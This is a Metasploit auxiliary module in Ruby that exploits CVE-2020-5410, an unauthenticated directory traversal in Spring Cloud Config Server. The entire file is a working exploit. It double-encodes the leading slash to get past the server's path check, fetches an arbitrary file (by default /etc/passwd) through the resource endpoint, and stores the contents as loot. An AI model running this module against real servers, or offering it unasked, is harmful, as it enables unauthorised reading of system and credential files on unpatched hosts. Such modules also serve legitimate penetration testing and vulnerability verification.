##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Directory Traversal in Spring Cloud Config Server',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability
          which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and
          2.1.x prior to 2.1.9, and older unsupported versions. Spring
          Cloud Config listens by default on port 8888.
        },
        'References' => [
          ['CVE', '2020-5410'],
          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410'],
          ['URL', 'https://xz.aliyun.com/t/7877']
        ],
        'Author' => [
          'Fei Lu', # Vulnerability discovery
          'bfpiaoran@qq.com', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
        'DisclosureDate' => '2020-06-01',
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'RPORT' => 8888 },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to Spring Cloud Config installation', '/']),
        OptString.new('FILEPATH', [true, 'The absolute path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Deprecated compatibility option; not used by the absolute-path resource endpoint', 11])
      ]
    )

    register_advanced_options(
      [
        OptString.new('APPLICATION', [true, 'Application name used by the resource repository', 'foo']),
        OptString.new('PROFILE', [true, 'Configuration profile used by the resource repository', 'default']),
        OptString.new('LABEL', [true, 'Repository label or branch used by the resource endpoint', 'master'])
      ]
    )
  end

  def run_host(ip)
    filename = datastore['FILEPATH'].to_s
    unless filename.start_with?('/')
      print_error('FILEPATH must be an absolute path on the Config Server')
      return
    end

    application = datastore['APPLICATION'].to_s
    profile = datastore['PROFILE'].to_s
    label = datastore['LABEL'].to_s
    if [application, profile, label].any? { |selector| selector.empty? || selector.include?('/') || selector.include?('\\') }
      print_error('APPLICATION, PROFILE and LABEL must each be a nonempty resource path segment')
      return
    end

    vprint_status('DEPTH is retained for compatibility and is not used by the absolute-path resource endpoint')
    # The resource endpoint needs the first slash double-encoded to bypass the
    # path check. Parent-directory prefixes do not implement CVE-2020-5410.
    resource = Rex::Text.uri_encode(filename.b, 'hex-normal').sub(%r{\A/}, '%252F')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, Rex::Text.uri_encode(application.b), Rex::Text.uri_encode(profile.b), Rex::Text.uri_encode(label.b), resource),
      'encode' => false,
      # Select ResourceController.binary, preserving binary and empty files
      # without UTF-8 conversion or configuration placeholder substitution.
      'headers' => { 'Accept' => 'application/octet-stream' }
    })

    unless res
      print_error('File download failed: the Config Server did not respond')
      return
    end

    unless res.code == 200
      print_error("File download failed: HTTP #{res.code}")
      return
    end

    content_type = res.headers['Content-Type'].to_s.split(';', 2).first.to_s.strip.downcase
    unless content_type == 'application/octet-stream' && res.body.is_a?(String)
      print_error('File download failed: the response is not a binary resource')
      return
    end

    print_good("Downloaded #{res.body.bytesize} bytes")
    path = store_loot(
      'springcloud.traversal',
      'application/octet-stream',
      ip,
      res.body.b,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
